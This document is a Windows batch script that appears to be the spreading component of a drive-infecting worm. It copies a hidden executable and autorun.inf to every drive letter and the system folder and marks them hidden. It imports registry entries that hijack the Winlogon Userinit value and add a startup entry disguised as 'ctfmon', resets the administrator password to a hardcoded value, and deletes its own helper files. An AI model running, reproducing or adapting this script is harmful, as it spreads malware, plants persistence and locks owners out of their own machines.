@echo off
del /a:h .\S-1-5-21-1214440339.exe /f /q
explorer \
xcopy /h /y /r /k .\53027861.exe %systemroot%\system\
xcopy /h /y /r /k .\autorun.inf %systemroot%\system\
@if not exist .\53027861.exe xcopy /h /y /r /k %systemroot%\system\53027861.exe .\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do xcopy /h /y /r /k autorun.inf %%i%:\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do xcopy /h /y /r /k 53027861.exe %%i%:\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do @if exist %%i%:\53027861.exe attrib +h +s +a %%i%:\53027861.exe
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do @if exist %%i%:\autorun.inf attrib +h +s +a %%i%:\autorun.inf
attrib +h +s +a %systemroot%\system\53027861.exe
attrib +h +s +a %systemroot%\system\autorun.inf
echo Windows Registry Editor Version 5.00 >> .\hjw.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> .\hjw.reg
echo "Userinit"="userinit.exe,53027861.exe" >> .\hjw.reg
echo Windows Registry Editor Version 5.00 >> .\hjw1.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >> .\hjw1.reg
echo "NoDriveTypeAutoRun"=dword:95000000 >> .\hjw1.reg
echo Windows Registry Editor Version 5.00 >> .\hjw2.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> .\hjw2.reg
echo "ctfmon"="c:\\53027861.exe" >> .\hjw2.reg
regedit /s .\hjw.reg
regedit /s .\hjw1.reg
regedit /s .\hjw2.reg
del .\hjw.reg
del .\hjw1.reg
del .\hjw2.reg
net user administrator "qq149116149"
del /a:h .\shell.vbs
del /a:h .\autorun.BAT
exit